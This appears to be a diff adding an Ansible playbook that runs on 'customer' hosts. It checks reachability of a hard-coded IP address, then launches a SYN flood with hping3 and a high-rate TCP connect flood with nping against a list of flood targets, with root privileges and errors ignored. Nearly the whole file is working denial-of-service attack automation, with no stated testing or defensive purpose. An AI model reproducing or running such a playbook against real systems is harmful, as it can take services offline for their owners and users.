@@ -1,0 +1,33 @@
+- hosts: customer
+  gather_facts: no
+
+  tasks:
+
+  - name: "Check flood target reachibility"
+    uri:
+      url: "http://80.94.224.35"
+    with_items:
+    - "{{ flood_targets }}"
+
+  # SYN flood
+  - name: "SYN Flood"
+    become: yes
+    shell:  |
+      hping3 -n -S --flood -p 80 {{ item }} &
+      sleep 10
+      pkill hping3
+    loop: "{{ flood_targets }}"
+    ignore_errors: yes
+
+  # SYN flood
+  - name: "TCP Flood"
+    become: yes
+    shell:  |
+      nping --tcp-connect -rate=50 -c=1000000 -q {{ item }} -p80  &
+      sleep 120
+      pkill nping
+    loop: "{{ flood_targets }}"
+    ignore_errors: yes
+
+  - debug:
+      msg: "flood ok!"
